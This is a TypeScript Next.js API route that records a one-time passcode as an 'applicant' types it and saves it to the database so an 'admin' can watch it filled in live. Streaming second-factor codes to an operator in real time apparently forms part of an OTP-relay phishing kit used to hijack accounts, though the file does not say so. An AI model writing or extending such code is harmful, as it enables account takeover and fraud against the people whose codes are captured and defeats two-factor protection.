import { NextResponse } from "next/server";
import { getSessionUser } from "@/lib/auth";
import { getDb } from "@/lib/db";
import { OTP_LENGTH } from "@/lib/activation";

export const dynamic = "force-dynamic";

/**
 * Captures the code the applicant is entering on the OTP screen, so the admin
 * can watch it filled in live on the dashboard. Only stored while the applicant
 * is actually on the OTP step.
 */
export async function POST(request: Request) {
  const user = await getSessionUser();
  if (!user || user.role !== "agent") {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  let body: { code?: unknown };
  try {
    body = (await request.json()) as { code?: unknown };
  } catch {
    return NextResponse.json({ error: "Invalid JSON" }, { status: 400 });
  }

  const code = String(body.code ?? "").replace(/\D/g, "").slice(0, OTP_LENGTH);

  await getDb()
    .prepare("UPDATE users SET typed_otp = ? WHERE id = ? AND activation_stage = 'otp'")
    .run(code, user.id);

  return NextResponse.json({ ok: true }, { headers: { "Cache-Control": "no-store" } });
}
